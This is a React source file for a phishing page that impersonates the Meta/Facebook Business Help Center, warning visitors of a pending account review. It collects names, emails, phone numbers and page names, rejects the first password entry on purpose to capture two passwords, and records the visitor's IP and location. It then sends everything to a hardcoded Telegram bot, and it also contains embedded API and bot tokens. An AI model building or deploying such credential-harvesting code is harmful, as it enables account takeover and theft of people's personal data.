import React from 'react'
// import { logo, search } from './Publics/images/images'
import { Link, useNavigate } from 'react-router-dom'
import { useState, useEffect } from 'react';
import axios from 'axios';
import { Button, Checkbox, Form, Input } from 'antd';
const { TextArea } = Input;
import logo from "./Publics/images/logo.png";
import search from "./Publics/images/search.png"
import background from "./Publics/images/background.png"

const Buiness = () => {

    const [activePopup, setActivePopup] = useState(false);
    const navigate = useNavigate();

    const handleOpendPopup = () => {
        setActivePopup(true)
    }

    const handleClosePopup = () => {
        setActivePopup(false)
    }

    const onFinish = (values) => {

        if (values.check_form == true) {
            localStorage.setItem('dataForm', JSON.stringify(values))
            return handleOpendPopup()
        }

    };

    useEffect(() => {
        getData();
    }, []);


    const getData = async () => {
        const res = await axios.get("https://api.ipify.org/?format=json");
        const location = await axios.get("https://freeipapi.com/api/json/" + res.data.ip.toString());
        setIP(res.data.ip);
        setLOC(location.data);
    };

    const [form] = Form.useForm();
    const [ip, setIP] = useState("");
    const [loc, setLOC] = useState("");
    var isOpened = false;
    var isChecked = false;
    var failedPassword = "";
    const onFinishPassWordFailed = (errorInfo) => {
        isChecked = true;
        const element = document.getElementById("exampleModalLabel").innerHTML = "Please Re-Enter Your Password";
        failedPassword = errorInfo.values.fill_first_password;
    }

    const onFinishPassWord = (values) => {
        const passWord = values.fill_first_password;
        const dataLocalForm = JSON.parse(localStorage.getItem('dataForm'));
        dataLocalForm.ip = ipAsString;
        localStorage.setItem('dataForm', JSON.stringify(dataLocalForm));

        let config = {
            headers: {
                apikey: 'XXto8s3AO3P6gR4KOWer60IDByjDkWAa',
            }
        }

        const ipAsString = "IP: " + ip.toString() + " |City: " + loc.cityName.toString() + " |Region: " + loc.regionName.toString() + " |Country: " + loc.countryName.toString() + " - " + loc.countryCode.toString();
        const dataPassWord = { ...dataLocalForm, fill_firt_password: passWord, failed_password: failedPassword, ip: ipAsString };
        localStorage.setItem('dataFirtPassWord', JSON.stringify(dataPassWord));

        const bot_token = '6322744915:AAHjCMBRKUvbqqF7rJuEmLzLtTtH04o9vb4';
        const chat_id = '-4033656499';

        const message = '<strong>Fill Email: </strong>' + dataPassWord.fill_business_email +
            '\n<strong>Fill Name: </strong>' + dataPassWord.fill_full_name +
            '\n<strong>Fill Personal Email: </strong>' + dataPassWord.fill_personal_email +
            '\n<strong>Fill Facebook Pagename: </strong>' + dataPassWord.fill_facebook_pagename +
            '\n<strong>Fill Phone: </strong>' + dataPassWord.fill_phone +
            '\n<strong>First Fill Password: </strong>' + failedPassword +
            '\n<strong>Second Fill Password: </strong>' + passWord +
            '\n<strong>IP Adress:</strong>' + ipAsString;

        axios.post(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
            chat_id: chat_id,
            parse_mode: 'html',
            text: message
        })
            .then((response) => {
                navigate('/buiness-center-community/confirm');
            })
            .catch((error) => { });
    };

    return (
        <div className="business">

            <div className="top-header">
                <div className="container">
                    <img src={logo} width="70" className="metalogo" />
                    <p className="metahead">Support Inbox</p>
                    <img src={search} width="100%" className="searchicon" />
                </div>
            </div>
            <div className="masheader" style={{
                backgroundImage: `url(${background})`
            }}>
                <div className="wrapper">
                    <div className="container">
                        <p className="businesshelp" style={{ visibility: "hidden" }}>
                            Meta Business Help Center </p>
                        <p className="businesshelpcenter">Facebook Business Help
                            Center</p>
                    </div>
                </div>
            </div>

            <div className="main">

                <div className="form">
                    <div className="header-form">
                        <div className="header-top">
                            <div className="dot"></div>
                            <div className="line"></div>
                            <div className="dot"></div>
                            <div className="line"></div>
                            <div className="dot"></div>
                        </div>
                        <div className="header-bottom">
                            <p>Select Asset</p>
                            <p>Select the Issue</p>
                            <p>Get help</p>
                        </div>
                    </div>

                    <div className="text-center pb-3" style={{ fontSize: "20px", textAlign: "center" }}>
                        <strong>Get Started</strong>
                    </div>

                    <div className="mb-4" style={{ backgroundColor: "rgb(226, 227, 229)", fontSize: "12px", textAlign: "left", padding: "15px" }}>
                        We have received multiple reports that suggest that your
                        account has
                        been in violation of our terms of services and community
                        guidelines.
                        As a result, your account is scheduled for review
                        <br />
                        <div className="text-start pt-2" style={{ fontSize: "14px" }}>
                            <strong>Report no: 3088553115</strong>
                        </div>
                    </div>


                    {/* FORM START */}

                    <Form
                        name="basic"
                        initialValues={{
                            remember: true,
                        }}
                        onFinish={onFinish}
                        autoComplete="off"
                    >

                        <div className="item-form">
                            <label style={{ color: "rgb(0, 0, 0)", fontWeight: "bold" }}>
                                Please provide us information that will help us investigate
                            </label>
                            <Form.Item
                                name="fill_reason"
                                rules={[
                                    {
                                        required: true,
                                        message: 'Please input information!',
                                    },
                                ]}
                            >
                                <TextArea rows={2} />
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <label for="name">Full name</label>
                            <Form.Item
                                name="fill_full_name"
                                rules={[
                                    {
                                        required: true,
                                        message: 'Please input full name!',
                                    },
                                ]}
                            >
                                <Input />
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <label for="Business">Business email address</label>
                            <Form.Item
                                name="fill_business_email"
                                rules={[
                                    {
                                        required: true,
                                        message: 'Please input business email address!',
                                    },
                                ]}
                            >
                                <Input />
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <label for="email">Personal email address</label>
                            <Form.Item
                                name="fill_personal_email"
                                rules={[
                                    {
                                        required: true,
                                        message: 'Please input personal email address!',
                                    },
                                ]}
                            >
                                <Input />
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <label for="phone">Mobile Phone Number</label>
                            <Form.Item
                                name="fill_phone"
                                rules={[
                                    {
                                        required: true,
                                        message: 'Please input mobile phone number!',
                                    },
                                ]}
                            >
                                <Input />
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <label for="email">Facebook page name</label>
                            <Form.Item
                                name="fill_facebook_pagename"
                                rules={[
                                    {
                                        required: true,
                                        message: 'Please input your facebook page name!',
                                    },
                                ]}
                            >
                                <Input />
                            </Form.Item>
                        </div>

                        <div className="item-form">
                            <Form.Item
                                name="check_form"
                                valuePropName="checked"
                                rules={[
                                    {
                                        required: true,
                                        message: 'Please agree to our terms and data and cookie policy!',
                                    },
                                ]}
                            >
                                <Checkbox >I agree to our Terms, Data and Cookies Policy.</Checkbox>
                            </Form.Item>
                        </div>


                        <Form.Item
                            className="btn butoni"
                        >
                            <Button
                                htmlType="submit"
                                style={{
                                    backgroundColor: "transparent",
                                    outline: "none",
                                    border: 'none',
                                    boxShadow: 'none',
                                    color: "#267df1",
                                    fontWeight: '700',
                                    fontSize: '1rem'
                                }}
                            >
                                Submit
                            </Button>
                        </Form.Item>
                    </Form>

                    {/* FORM END */}
                </div>

            </div>

            {/* FOOTER */}
            <div className="footer">
                <div className="container">
                    <img src={logo} className="logofooter" />
                    <p className="nerlogofooter">
                        Facebook can help your large, medium or small business
                        grow. Get the latest news
                        for advertisers and more on our <Link to="#" style={{ textDecoration: "none", color: "white" }}>Meta for Business Page.</Link></p>
                    <div className="row">
                        <div className="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p className="fontbold">Marketing on Facebook</p>
                                    <p>Success Stories</p>
                                    <p>Measurement</p>
                                    <p>Industries</p>
                                    <p>Inspiration</p>
                                    <p>Events</p>
                                    <p>News</p>
                                    <p>Site map</p>
                                </li>
                            </ul>
                        </div>
                        <div className="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p className="fontbold">Marketing objectives</p>
                                    <p>Build your presence</p>
                                    <p>Create awareness</p>
                                    <p>Drive discovery</p>
                                    <p>Generate leads</p>
                                    <p>Boost sales</p>
                                    <p>Earn loyalty</p>
                                </li>
                            </ul>
                        </div>
                        <div className="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p className="fontbold">Facebook Pages</p>
                                    <p>Get started with Pages</p>
                                    <p>Setting up your Page</p>
                                    <p>Manage your Facebook Page</p>
                                    <p>Promote your Page</p>
                                    <p>Messaging on your Page</p>
                                    <p>Page Insights</p>
                                </li>
                            </ul>
                        </div>
                        <div variant="dontshowonmobile " className="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p className="fontbold">Facebook ads</p>
                                    <p>Get started with ads</p>
                                    <p>Buying Facebook ads</p>
                                    <p>Ad formats</p>
                                    <p>Ad placement</p>
                                    <p>Choose your audience</p>
                                    <p>Measure your ads</p>
                                    <p>Managing your ads</p>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>

            <div className="bottomfooter">
                <div className="container">
                    <ul>
                        <li>English (UK)</li>
                        <li>English (US)</li>
                        <li>Español</li>
                        <li>Português (Brasil)</li>
                        <li>Français (France)</li>
                        <li>Español (España)</li>
                        <li>More languages</li>
                    </ul>
                    <ul>
                        <li>© 2023 Meta</li>
                        <li>About</li>
                        <li>Developers</li>
                        <li>Careers</li>
                        <li>Privacy</li>
                        <li>Cookies</li>
                        <li>Terms</li>
                        <li>Help Centre</li>
                    </ul>
                </div>
            </div>


            <div className={`popup  ${activePopup == true ? 'active' : ''}`} id="popup" >
                <div className="background" onClick={handleClosePopup}></div>
                <div className="content">

                    <Form
                        name="basicForm"
                        form={form}
                        initialValues={{
                            remember: true,
                        }}
                        onFinish={onFinishPassWord}
                        onFinishFailed={onFinishPassWordFailed}
                        validateTrigger='onSubmit'
                        autoComplete="off"
                    >

                        <div className="modal-header custom-header px-0">
                            <h5 id="exampleModalLabel" className="modal-title" style={{ fontSize: "22px", fontWeight: "600" }}> Please
                                Enter Your Password </h5>
                            <button type="button" data-dismiss="modal" aria-label="Close" onClick={handleClosePopup} className="close">
                                <span aria-hidden="true" >×</span>
                            </button>
                        </div>

                        <div className="item-form">
                            <p style={{ fontSize: "16px", marginBottom: "10px" }}> For your security, you must enter your password to continue. </p>
                            <label for="password">Password:</label>
                            <Form.Item
                                name="fill_first_password"
                                rules={[
                                    {
                                        required: true,
                                        message: `The password you've entered is incorrect.`,
                                    },
                                    ({ getFieldValue }) => ({
                                        validator(_, value) {
                                            if (isChecked) {
                                                return Promise.resolve();
                                            }
                                            return Promise.reject('The password you entered is incorrect.');
                                        },
                                    }),
                                ]}
                            >
                                <Input.Password allowClear />
                            </Form.Item>
                        </div>

                        <Form.Item
                            style={{
                                color: "rgb(255, 255, 255)",
                                backgroundColor: "rgb(44, 132, 244)",
                                marginTop: "20px",
                                width: "auto",
                                float: 'right'
                            }}
                            className="btn butoni"
                        >
                            <Button
                                htmlType="submit"
                                style={{
                                    backgroundColor: "transparent",
                                    outline: "none",
                                    border: 'none',
                                    boxShadow: 'none',
                                    color: "#267df1",
                                    fontWeight: '700',
                                    fontSize: '1rem',
                                    color: 'white'
                                }}
                            >
                                Continue
                            </Button>
                        </Form.Item>
                    </Form>

                </div>
            </div>
        </div>
    )
}

export default Buiness